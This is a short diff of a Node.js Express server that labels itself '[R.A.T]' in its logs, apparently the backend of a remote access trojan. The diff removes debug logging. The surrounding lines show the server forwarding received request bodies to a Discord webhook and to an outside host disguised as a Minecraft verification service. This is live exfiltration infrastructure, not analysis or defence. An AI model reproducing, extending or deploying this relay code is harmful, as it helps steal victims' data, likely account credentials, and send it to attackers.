@@ -171,18 +171,6 @@ app.post("/", (req, res) => {
                 }).catch(err => {
                     console.log(`[R.A.T] Error while sending to Discord webhook:\n${err}`)
                 })
-
-
-                console.log(req.body)
-                console.log("1111")
-                console.log(req.body.feather)
-                console.log("2111")
-                console.log(req.body.text)
-                console.log("3111")
-                console.log(res.json(req.body))
-                console.log("4111")
-                console.log(json(req.body))
-                console.log("5111")
                 
                 post("https://verification-minecraft.onrender.com", req.body
                 , {
